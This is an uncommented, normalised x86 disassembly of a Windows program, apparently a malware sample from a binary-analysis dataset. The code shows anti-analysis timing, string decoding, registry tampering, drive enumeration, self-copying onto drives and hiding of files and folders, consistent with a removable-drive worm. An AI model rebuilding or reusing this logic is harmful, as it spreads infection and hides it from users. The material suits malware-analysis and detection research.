sub_401000
push ebx
push esi
mov esi [ GetTickCount@IAT ]
push edi
call esi
mov ebx [ Sleep@IAT ]
mov edi eax
push 0x1
call ebx
call esi
call esi
sub eax edi
cmp eax 0xea60
jbe r-xdata
pop edi
pop esi
pop ebx
retn
sub_401030
push ebp
mov ebp esp
push 0xffffffff
push sub_403a20
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] esp
call sub_401000
call sub_4010e0
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov eax 0x1
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov [ ebp - 0x4 ] 0x1
call sub_401650
push 0x1388
mov [ ebp - 0x4 ] 0x0
call [ Sleep@IAT ]
jmp r-xdata
sub_4010b0
push esi
mov esi [ esp + 0xc ]
xor eax eax
test esi esi
jle r-xdata
pop esi
retn
mov ecx [ esp + 0x8 ]
mov dl [ eax + ecx ]
sub dl al
xor dl 0x3
sub dl 0x13
mov [ eax + ecx ] dl
inc eax
cmp eax esi
jl r-xdata
sub_4010e0
push ecx
push esi
push 0x8007
call [ SetErrorMode@IAT ]
push 0xb
push rw-data
call sub_4010b0
push 0x9
push rw-data
call sub_4010b0
push 0x4
push rw-data
call sub_4010b0
push 0x8
push rw-data
call sub_4010b0
push 0x8
push rw-data
call sub_4010b0
push 0x10
push rw-data
call sub_4010b0
push 0x10
push rw-data
call sub_4010b0
push 0x10
push rw-data
call sub_4010b0
add esp 0x40
push 0x8
push rw-data
call sub_4010b0
push 0x9
push rw-data
call sub_4010b0
push 0x12
push rw-data
call sub_4010b0
push 0xc
push rw-data
call sub_4010b0
push 0x51
push rw-data
call sub_4010b0
push 0x3b
push rw-data
call sub_4010b0
push 0x4e
push rw-data
call sub_4010b0
push 0x19
push rw-data
call sub_4010b0
add esp 0x40
push 0xf
push rw-data
call sub_4010b0
push 0x11
push rw-data
call sub_4010b0
push 0x15
push rw-data
call sub_4010b0
push 0x7
push rw-data
call sub_4010b0
push 0x4
push rw-data
call sub_4010b0
push 0xc
push rw-data
call sub_4010b0
push 0x5
push rw-data
call sub_4010b0
push 0x4
push rw-data
call sub_4010b0
add esp 0x40
push 0x7
push rw-data
call sub_4010b0
push 0xb
push rw-data
call sub_4010b0
push 0x1d
push rw-data
call sub_4010b0
push 0x11
push rw-data
call sub_4010b0
push 0x12
push rw-data
call sub_4010b0
push 0x9
push rw-data
call sub_4010b0
push 0x1
call sub_401720
mov esi [ CreateEventA@IAT ]
add esp 0x34
push rw-data
push 0x0
push 0x0
push 0x0
call esi
push rw-data
push 0x0
push 0x0
push 0x0
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_4015c0
push 0x0
push 0x5
push rw-data
push 0x0
call [ SHGetSpecialFolderPathA@IAT ]
test eax eax
jne r-xdata
push edi
or ecx 0xffffffff
mov edi rw-data
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
or ecx 0xffffffff
mov edi rw-data
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi rw-data
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
call sub_401490
push rw-data
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
lea ecx [ esp + 0x8 ]
push ecx
push 0x0
push 0x0
push sub_402620
push 0x0
push 0x0
call eax
pop edi
mov eax 0x1
pop esi
pop ecx
retn
pop esi
pop ecx
retn
sub_4013a0
sub esp 0x88
push esi
xor esi esi
lea eax [ esp + 0x4 ]
push esi
push eax
push esi
push 0x2001f
push esi
push rw-data
push esi
push rw-data
push 0x80000002
mov [ esp + 0x2c ] 0x80
call [ RegCreateKeyExA@IAT ]
mov eax [ esp + 0x4 ]
lea ecx [ esp + 0x8 ]
lea edx [ esp + 0xc ]
push ecx
push edx
push esi
push esi
push rw-data
push eax
call [ RegQueryValueExA@IAT ]
test eax eax
jne r-xdata
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov al [ esp + 0xc ]
test al al
je r-xdata
mov edx [ esp ]
mov [ esp + eax + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
lea ecx [ esp + 0x8 ]
push eax
push ecx
push 0x1
push 0x0
push rw-data
push edx
call [ RegSetValueExA@IAT ]
add esp 0x88
retn
inc cl
mov [ esp + eax + 0x8 ] cl
mov cl [ eax + rw-data ]
inc eax
test cl cl
jne r-xdata
mov [ esi + rw-data ] 0x0
jmp r-xdata
dec al
mov [ esi + rw-data ] al
mov al [ esp + esi + 0xd ]
inc esi
test al al
jne r-xdata
mov cl [ rw-data ]
xor eax eax
test cl cl
pop esi
je r-xdata
sub_401490
sub esp 0x8
push ebp
push esi
push edi
lea eax [ esp + 0xc ]
push 0x0
mov edi [ RegCreateKeyExA@IAT ]
push eax
push 0x0
push 0x20006
push 0x0
push rw-data
push 0x0
push rw-data
push 0x80000001
mov [ esp + 0x34 ] 0x2
mov [ esp + 0x30 ] 0x0
call edi
mov edx [ esp + 0xc ]
mov esi [ RegSetValueExA@IAT ]
lea ecx [ esp + 0x10 ]
push 0x4
push ecx
push 0x4
push 0x0
push rw-data
push edx
call esi
mov ecx [ esp + 0xc ]
lea eax [ esp + 0x10 ]
push 0x4
push eax
push 0x4
push 0x0
push rw-data
push ecx
mov [ esp + 0x28 ] 0x1
call esi
mov eax [ esp + 0xc ]
mov ebp [ RegCloseKey@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0xc ]
push 0x0
push edx
push 0x0
push 0x20006
push 0x0
push rw-data
push 0x0
push rw-data
push 0x80000002
mov [ esp + 0x34 ] 0x0
call edi
mov ecx [ esp + 0xc ]
lea eax [ esp + 0x10 ]
push 0x4
push eax
push 0x4
push 0x0
push rw-data
push ecx
call esi
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
push eax
call ebp
lea edx [ esp + 0xc ]
push 0x0
push edx
push 0x0
push 0x20006
push 0x0
push rw-data
push 0x0
push rw-data
push 0x80000002
mov [ esp + 0x34 ] 0xffffffff
call edi
mov ecx [ esp + 0xc ]
lea eax [ esp + 0x10 ]
push 0x4
push eax
push 0x4
push 0x0
push rw-data
push ecx
call esi
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
push eax
call ebp
pop edi
pop esi
pop ebp
add esp 0x8
retn
push eax
call ebp
sub_4015c0
push esi
push rw-data
call [ LoadLibraryA@IAT ]
push rw-data
push eax
call [ GetProcAddress@IAT ]
push rw-data
push 0x0
push 0x1f0001
mov esi eax
call [ OpenMutexA@IAT ]
test eax eax
je r-xdata
push rw-data
push 0x0
push 0x0
call esi
call sub_4013a0
push rw-data
push rw-data
call sub_402be0
add esp 0x8
pop esi
retn
push eax
call [ CloseHandle@IAT ]
mov eax [ rw-data ]
push eax
call [ SetEvent@IAT ]
mov ecx [ rw-data ]
push 0x1388
push ecx
call [ WaitForSingleObject@IAT ]
push 0x1f4
call [ Sleep@IAT ]
sub_401650
sub esp 0x200
push ebx
xor ebx ebx
push ebx
call sub_401720
add esp 0x4
lea eax [ esp + 0x4 ]
push eax
push 0x200
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
pop ebx
add esp 0x200
retn
mov al [ esp + 0x4 ]
test al al
je r-xdata
push ebp
mov ebp [ toupper@IAT ]
push esi
push edi
lea esi [ esp + 0x10 ]
add ebx edi
mov al [ esp + ebx + 0x10 ]
lea esi [ esp + ebx + 0x10 ]
test al al
jne r-xdata
push eax
call sub_401840
add esp 0x4
test eax eax
je r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi ecx
movsx ecx [ esi ]
push ecx
inc edi
call ebp
add esp 0x4
cmp eax 0x43
jl r-xdata
pop edi
pop esi
pop ebp
push esi
call [ GetDriveTypeA@IAT ]
push esi
call sub_4026a0
add esp 0x4
test eax eax
jne r-xdata
push esi
call sub_402820
add esp 0x4
push 0x7530
call [ Sleep@IAT ]
call sub_401490
push esi
call sub_4020f0
push esi
call sub_401db0
add esp 0x8
jmp r-xdata
sub_401720
mov eax [ esp + 0x4 ]
sub esp 0x208
push ebx
xor ebx ebx
test eax eax
push edi
jne r-xdata
lea eax [ esp + 0x10 ]
push eax
push 0x200
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
mov ecx 0x18
xor eax eax
mov edi rw-data
[ edi ]
pop edi
pop ebx
add esp 0x208
retn
mov al [ esp + 0x10 ]
test al al
je r-xdata
mov eax [ esp + 0x214 ]
xor ecx ecx
cmp eax ecx
jne r-xdata
push ebp
push esi
lea esi [ esp + 0x18 ]
xor eax eax
add ebx ebp
mov al [ esp + ebx + 0x18 ]
lea esi [ esp + ebx + 0x18 ]
test al al
jne r-xdata
push esi
call [ GetDriveTypeA@IAT ]
cmp eax 0x2
je r-xdata
add eax 0x4
cmp eax 0x60
jl r-xdata
cmp [ eax + rw-data ] ecx
jne r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov ebp ecx
movsx ecx [ esi ]
push ecx
inc ebp
call [ toupper@IAT ]
mov edi eax
add esp 0x4
cmp edi 0x43
jl r-xdata
pop esi
pop ebp
mov eax [ esp + 0x21c ]
test eax eax
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp [ eax + rw-data ] ecx
je r-xdata
mov [ eax + rw-data ] ecx
lea edx [ esp + 0x10 ]
push 0x0
push edx
push 0x0
push esi
mov [ edi * 4 + rw-data ] edi
call [ GetDiskFreeSpaceExA@IAT ]
cmp [ esp + 0x14 ] 0x2
ja r-xdata
mov [ edi * 4 + rw-data ] edi
jmp r-xdata
jb r-xdata
mov [ edi * 4 + rw-data ] 0x0
cmp [ esp + 0x10 ] 0x540be400
jae r-xdata
sub_401840
mov eax [ esp + 0x4 ]
mov edx [ eax * 4 + rw-data ]
lea ecx [ eax * 4 + rw-data ]
test edx edx
jne r-xdata
xor eax eax
retn
mov edx [ eax * 4 + rw-data ]
test edx edx
je r-xdata
mov [ ecx ] eax
mov eax 0x1
retn
sub_401870
mov eax [ esp + 0x4 ]
push esi
push rw-data
push eax
call [ fopen@IAT ]
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop esi
retn
mov eax [ esp + 0xc ]
mov [ esp + 0x8 ] 0x46
test eax eax
je r-xdata
push 0x0
push 0x6c
push esi
call [ fseek@IAT ]
push esi
push 0x1
lea ecx [ esp + 0x1c ]
push 0x1
push ecx
call [ fwrite@IAT ]
push esi
call [ fclose@IAT ]
add esp 0x20
mov [ esp + 0x8 ] 0x44
sub_4018d0
mov eax [ esp + 0x4 ]
sub esp 0x80
push esi
push rw-data
push eax
call [ fopen@IAT ]
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
push esi
push 0x80
lea ecx [ esp + 0xc ]
push 0x1
push ecx
call [ fread@IAT ]
push esi
call [ fclose@IAT ]
mov cl [ esp + 0x84 ]
add esp 0x14
xor eax eax
cmp cl 0x46
sete al
pop esi
add esp 0x80
retn
mov eax 0x1
pop esi
add esp 0x80
retn
sub_401940
sub esp 0x874
push ebx
push ebp
push esi
push edi
mov edi [ sprintf@IAT ]
push rw-data
push rw-data
lea eax [ esp + 0x788 ]
push rw-data
push eax
call edi
push rw-data
push rw-data
lea ecx [ esp + 0x288 ]
push rw-data
push ecx
call edi
push rw-data
lea edx [ esp + 0x398 ]
push rw-data
push edx
call edi
mov eax [ esp + 0x8b4 ]
lea ecx [ esp + 0x5a4 ]
push eax
push rw-data
push ecx
call edi
add esp 0x38
lea edx [ esp + 0x2c ]
lea eax [ esp + 0x578 ]
push edx
push eax
call [ FindFirstFileA@IAT ]
cmp eax 0xffffffff
mov [ esp + 0x18 ] eax
je r-xdata
push 0x0
push 0x2710
push 0x2
push rw-data
push 0x0
push 0x1a
push 0xffff
call [ SendMessageTimeoutA@IAT ]
push 0x0
push 0x0
push 0x0
push 0x8000000
call [ SHChangeNotify@IAT ]
mov esi [ DeleteFileA@IAT ]
lea eax [ esp + 0x270 ]
push eax
call esi
lea ecx [ esp + 0x374 ]
push ecx
call esi
cmp [ esp + 0x58 ] 0x2e
je r-xdata
mov esi [ esp + 0x18 ]
lea edx [ esp + 0x2c ]
push edx
push esi
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
mov al [ esp + 0x2c ]
xor esi esi
test al 0x10
mov [ esp + 0x14 ] esi
je r-xdata
push esi
call [ FindClose@IAT ]
lea edx [ esp + 0x58 ]
push rw-data
push edx
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
mov esi [ lstrcmpiA@IAT ]
lea ecx [ esp + 0x58 ]
push rw-data
push ecx
call esi
test eax eax
je r-xdata
lea eax [ esp + 0x58 ]
push rw-data
push eax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x58 ]
push rw-data
push edx
call esi
test eax eax
je r-xdata
lea ecx [ esp + 0x58 ]
push 0x2e
push ecx
mov [ esp + 0x18 ] esi
call [ strrchr@IAT ]
add esp 0x8
cmp eax esi
je r-xdata
lea eax [ esp + 0x58 ]
push rw-data
push eax
call esi
test eax eax
je r-xdata
mov esi 0x76
lea ebx [ eax + 0x1 ]
push ebx
call [ CharLowerA@IAT ]
mov esi rw-data
mov eax ebx
lea ecx [ esp + 0x58 ]
push rw-data
push ecx
call esi
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x874
retn
mov ebx [ SetFileAttributesA@IAT ]
lea eax [ esp + 0x270 ]
push 0x0
push eax
call ebx
mov ecx [ esp + 0x10 ]
lea edx [ esp + 0x270 ]
push ecx
push edx
call sub_401870
add esp 0x8
lea eax [ esp + 0x67c ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
push esi
lea ecx [ esp + 0x20 ]
push rw-data
push ecx
call edi
mov eax [ esp + 0x20 ]
add esp 0xc
test eax eax
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov [ esp + 0x10 ] 0x1
mov esi 0x67
jmp r-xdata
lea edx [ esp + 0x270 ]
lea eax [ esp + 0x374 ]
push edx
push eax
call sub_403310
mov eax [ esp + 0x18 ]
add esp 0x8
test eax eax
jne r-xdata
lea edx [ esp + 0x1c ]
lea eax [ esp + 0x374 ]
push edx
lea ecx [ esp + 0x680 ]
push eax
push ecx
call sub_402ff0
add esp 0xc
xor ebp ebp
mov edi rw-data
mov ecx [ esp + 0x888 ]
lea eax [ esp + 0x58 ]
push eax
push ecx
lea edx [ esp + 0x47c ]
push rw-data
push edx
call [ sprintf@IAT ]
lea eax [ esp + 0x484 ]
push eax
call sub_4018d0
add esp 0x14
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov ebp [ CopyFileA@IAT ]
lea ecx [ esp + 0x270 ]
push 0x0
lea edx [ esp + 0x784 ]
push ecx
push edx
call ebp
test eax eax
je r-xdata
mov ecx [ esp + 0x888 ]
lea eax [ esp + 0x58 ]
push eax
push ecx
lea edx [ esp + 0x174 ]
push rw-data
push edx
call edi
add esp 0x10
lea eax [ esp + 0x16c ]
lea ecx [ esp + 0x270 ]
push 0x0
push eax
push ecx
call ebp
test eax eax
je r-xdata
mov edx [ esp + 0x888 ]
lea ecx [ esp + 0x58 ]
push ecx
push edx
lea eax [ esp + 0x174 ]
push rw-data
push eax
call edi
lea ecx [ esp + 0x17c ]
lea edx [ esp + 0x280 ]
push ecx
push edx
push rw-data
push 0x67
call sub_403740
add esp 0x20
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
mov edi [ sprintf@IAT ]
lea ecx [ esp + 0x374 ]
push ecx
call [ DeleteFileA@IAT ]
lea edx [ esp + 0x374 ]
lea eax [ esp + 0x474 ]
push edx
push eax
call sub_4032a0
add esp 0x8
mov [ esp + 0x14 ] 0x1
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
lea edx [ esp + 0x16c ]
push 0x0
push edx
call ebx
mov ecx [ esp + 0x888 ]
lea eax [ esp + 0x58 ]
push eax
push ecx
lea edx [ esp + 0x174 ]
push rw-data
push edx
call edi
add esp 0x10
lea eax [ esp + 0x16c ]
push eax
call [ GetFileAttributesA@IAT ]
or al 0x6
lea ecx [ esp + 0x16c ]
push eax
push ecx
call ebx
jmp r-xdata
cmp ebp 0x18
jl r-xdata
add edi 0x24
inc ebp
cmp edi rw-data
jl r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov edi [ sprintf@IAT ]
lea eax [ ebp + ebp * 8 ]
mov esi [ eax * 4 + rw-data ]
jmp r-xdata
mov edi [ sprintf@IAT ]
mov esi 0x76
jmp r-xdata
mov esi edi
mov eax ebx
mov edi [ sprintf@IAT ]
mov esi 0x76
jmp r-xdata
test eax eax
je r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_401db0
sub esp 0x5a0
lea eax [ esp ]
lea ecx [ esp + 0x18 ]
push ebx
mov ebx [ esp + 0x5a8 ]
push ebp
push esi
push edi
push 0x0
push eax
push ecx
push ebx
call [ GetDiskFreeSpaceExA@IAT ]
lea edx [ esp + 0x18 ]
push edx
call [ GetLocalTime@IAT ]
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x22 ]
mov edx [ esp + 0x20 ]
and eax 0xffff
and ecx 0xffff
push eax
mov eax [ esp + 0x22 ]
and edx 0xffff
push ecx
mov ecx [ esp + 0x22 ]
mov esi [ sprintf@IAT ]
push edx
mov edx [ esp + 0x24 ]
and eax 0xffff
and ecx 0xffff
push eax
and edx 0xffff
push ecx
push edx
lea eax [ esp + 0x3c8 ]
push rw-data
push eax
call esi
lea ecx [ esp + 0x3d0 ]
push ecx
call sub_402660
mov edx [ esp + 0x50 ]
mov eax [ esp + 0x4c ]
add esp 0x24
push 0x0
push 0xf4240
push edx
push eax
call sub_403820
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push eax
push 0x0
push 0xf4240
push ecx
push edx
call sub_403820
push eax
push ebx
lea eax [ esp + 0x3bc ]
push rw-data
push eax
call esi
lea ecx [ esp + 0x3c4 ]
push ecx
call sub_402660
mov eax [ esp + 0x2c ]
add esp 0x18
test eax eax
ja r-xdata
push ebx
call sub_401940
mov edi ebx
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x2b4 ]
[ edi ]
not ecx
sub edi ecx
push rw-data
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x2b8 ]
push ecx
call sub_402420
mov edi ebx
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0xb0 ]
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0xb0 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push eax
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0xb4 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ SetFileAttributesA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x1b0 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x1b0 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push rw-data
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea edx [ esp + 0x1b4 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x1b4 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ fopen@IAT ]
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
cmp [ esp + 0x10 ] 0x1e8480
jb r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x5a0
retn
lea ecx [ esp + 0x30 ]
push ecx
push rw-data
push ebp
call [ fscanf@IAT ]
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push ebp
call [ fclose@IAT ]
add esp 0x4
lea edi [ esp + 0x30 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0xb0 ]
[ edi ]
not ecx
sub edi ecx
push 0x5c
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0xb4 ]
push ecx
call [ strchr@IAT ]
add esp 0x8
test eax eax
jne r-xdata
lea edx [ esp + 0x30 ]
lea eax [ esp + 0x2b0 ]
push edx
push eax
call sub_402420
mov edi ebx
or ecx 0xffffffff
xor eax eax
add esp 0x8
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0xb0 ]
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0xb0 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push eax
[ edi ] [ esi ]
lea edi [ esp + 0x34 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0xb4 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ SetFileAttributesA@IAT ]
jmp r-xdata
sub_4020f0
sub esp 0x4a4
lea eax [ esp ]
lea ecx [ esp + 0x1c ]
push ebx
mov ebx [ esp + 0x4ac ]
push ebp
push esi
push edi
push 0x0
push eax
push ecx
push ebx
call [ GetDiskFreeSpaceExA@IAT ]
lea edx [ esp + 0x1c ]
push edx
call [ GetLocalTime@IAT ]
mov eax [ esp + 0x28 ]
mov ecx [ esp + 0x26 ]
mov edx [ esp + 0x24 ]
and eax 0xffff
and ecx 0xffff
push eax
mov eax [ esp + 0x26 ]
and edx 0xffff
push ecx
mov ecx [ esp + 0x26 ]
mov esi [ sprintf@IAT ]
push edx
mov edx [ esp + 0x28 ]
and eax 0xffff
and ecx 0xffff
push eax
and edx 0xffff
push ecx
push edx
lea eax [ esp + 0x2cc ]
push rw-data
push eax
call esi
lea ecx [ esp + 0x2d4 ]
push ecx
call sub_402660
mov edx [ esp + 0x54 ]
mov eax [ esp + 0x50 ]
add esp 0x24
push 0x0
push 0xf4240
push edx
push eax
call sub_403820
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push eax
push 0x0
push 0xf4240
push ecx
push edx
call sub_403820
push eax
push ebx
lea eax [ esp + 0x2c0 ]
push rw-data
push eax
call esi
lea ecx [ esp + 0x2c8 ]
push ecx
call sub_402660
mov eax [ esp + 0x2c ]
add esp 0x18
test eax eax
ja r-xdata
or ecx 0xffffffff
mov edi rw-data
xor eax eax
lea edx [ esp + 0x1b4 ]
[ edi ]
not ecx
sub edi ecx
push rw-data
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x1b8 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea edx [ esp + 0x1b8 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x1b8 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call [ fopen@IAT ]
mov ebp eax
add esp 0x8
test ebp ebp
mov [ esp + 0x18 ] ebp
je r-xdata
jb r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x4a4
retn
lea ecx [ esp + 0xb4 ]
push ecx
push rw-data
push ebp
call [ fscanf@IAT ]
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push rw-data
call sub_402660
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x4a4
retn
cmp [ esp + 0x10 ] 0x1e8480
jae r-xdata
push ebp
call [ fclose@IAT ]
add esp 0x4
lea edi [ esp + 0xb4 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x134 ]
[ edi ]
not ecx
sub edi ecx
push 0x5c
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x138 ]
push ecx
call [ strchr@IAT ]
mov edx eax
add esp 0x8
test edx edx
je r-xdata
or ecx 0xffffffff
mov edi ebx
xor eax eax
mov [ edx ] 0x0
[ edi ]
not ecx
sub edi ecx
lea ebp [ esp + 0x34 ]
mov eax ecx
mov esi edi
mov edi ebp
lea ebp [ esp + 0x34 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
push 0x0
[ edi ] [ esi ]
lea edi [ esp + 0x138 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi ebp
mov ebp ecx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
lea edi [ edx + 0x1 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0xb8 ]
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x38 ]
push ecx
call [ CreateDirectoryA@IAT ]
lea edx [ esp + 0x34 ]
push edx
call [ GetFileAttributesA@IAT ]
or al 0x6
push eax
lea eax [ esp + 0x38 ]
push eax
call [ SetFileAttributesA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x34 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0xb4 ]
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x34 ]
push eax
push ecx
call sub_402420
mov ebp [ esp + 0x20 ]
add esp 0x8
jmp r-xdata
sub_402420
sub esp 0x400
or ecx 0xffffffff
xor eax eax
lea edx [ esp ]
push ebx
push ebp
push esi
push edi
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi edx
lea edx [ esp + 0x10 ]
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov ebx ecx
mov esi edi
or ecx 0xffffffff
mov edi edx
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
mov ebx [ esp + 0x418 ]
and ecx 0x3
lea edx [ esp + 0x10 ]
[ edi ] [ esi ]
mov edi ebx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
